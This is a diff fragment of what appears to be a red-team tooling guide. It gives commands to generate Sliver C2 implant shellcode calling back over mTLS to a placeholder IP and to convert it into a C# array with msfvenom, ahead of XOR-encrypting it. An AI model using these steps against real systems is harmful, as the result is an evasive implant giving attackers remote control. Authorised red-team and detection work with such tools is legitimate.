@@ -12,7 +12,7 @@
 **1. Generate shellcode:**
 ```bash
 sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
-python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs
 ```
 
 **2. Add your shellcode bytes to `xor-shellcode-encryption-3-byte.cs`:**
